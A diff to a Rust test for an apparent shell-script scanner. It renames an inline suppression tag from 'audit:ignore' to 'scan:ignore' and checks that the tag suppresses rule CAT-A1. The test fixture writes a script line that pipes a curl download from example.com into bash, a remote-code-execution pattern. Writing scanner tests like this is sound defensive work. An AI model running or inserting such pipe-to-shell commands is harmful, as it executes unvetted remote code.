@@ -129,7 +129,7 @@ fn inline_suppression_works() {
     std::fs::create_dir_all(&scripts_dir).unwrap();
     std::fs::write(
         scripts_dir.join("test.sh"),
-        "#!/bin/bash\ncurl https://example.com/file.sh | bash # audit:ignore\n",
+        "#!/bin/bash\ncurl https://example.com/file.sh | bash # scan:ignore\n",
     )
     .unwrap();
 
@@ -141,7 +141,7 @@ fn inline_suppression_works() {
         .iter()
         .filter(|f| f.rule_id == "bash/CAT-A1")
         .collect();
-    assert!(a1.is_empty(), "Inline audit:ignore should suppress CAT-A1");
+    assert!(a1.is_empty(), "Inline scan:ignore should suppress CAT-A1");
 }
 
 #[test]
